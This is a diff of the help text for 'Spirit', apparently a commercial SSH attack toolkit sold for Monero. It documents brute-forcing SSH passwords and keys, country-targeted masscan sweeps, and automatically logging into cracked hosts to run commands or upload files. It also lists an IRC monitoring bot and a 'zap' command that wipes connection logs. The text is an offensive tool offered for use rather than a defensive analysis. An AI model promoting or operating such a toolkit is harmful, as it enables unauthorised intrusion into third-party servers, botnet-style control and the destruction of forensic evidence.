@@ -27,17 +27,17 @@ USAGE:
 
 COMMANDS:
    1-spirit:
-     banner, b     grab SSH banners without performing a login
-     brute, B      performs brute-force password guessing against ssh servers
-     brute-key, k  performs brute-force using a private key (default id_rsa)
-     auto, a       run [parse] [banner] [brute] automatically
+     banner, b  grab SSH banners without performing a login
+     brute, B   performs brute-force password guessing against ssh servers
+     auto, a    run [parse] [banner] [brute] automatically
+     scan, s    scan --lan --threads 5000
    2-spirit-pro:
-     omni, o      auto-ssh on all found.lst hosts and run commands or upload files
-     masscan, ms  masscan with automatic country zones (default cn)
-     abuse        check your host IP against abuse report databases
-     passwd       password generator for --user or /etc/passwd file
-     bot          IRC bot that monitors system changes and issues NOTICE on channel
-     scan, s      scan --range '11.*.*.*' --threads 5000
+     brute-key, k  performs brute-force using a private key (default id_rsa)
+     omni, o       auto-ssh on all found.lst hosts and run commands or upload files
+     masscan, ms   masscan with automatic country zones (default cn)
+     abuse         check your host IP against abuse report databases
+     passwd        password generator for --user or /etc/passwd file
+     bot           IRC bot that monitors system changes and issues NOTICE on channel
    3-tools:
      zap, z    [IP] clean connection logs (default SSH_CLIENT)
      parse, p  [FILE] parse masscan open ports from the -oG file (default open.lst)
@@ -47,6 +47,7 @@ COMMANDS:
      buy         buy [Spirit Pro] and support this project (XMR only) -- thank you!
      register    [KEY] register your Spirit license on this server
      upgrade, u  download the latest version features and bug fixes
+     reset       reset your registered servers
 
 GLOBAL OPTIONS:
    --command value, -c value  commands to execute on successful login (default: nproc;uname -a)
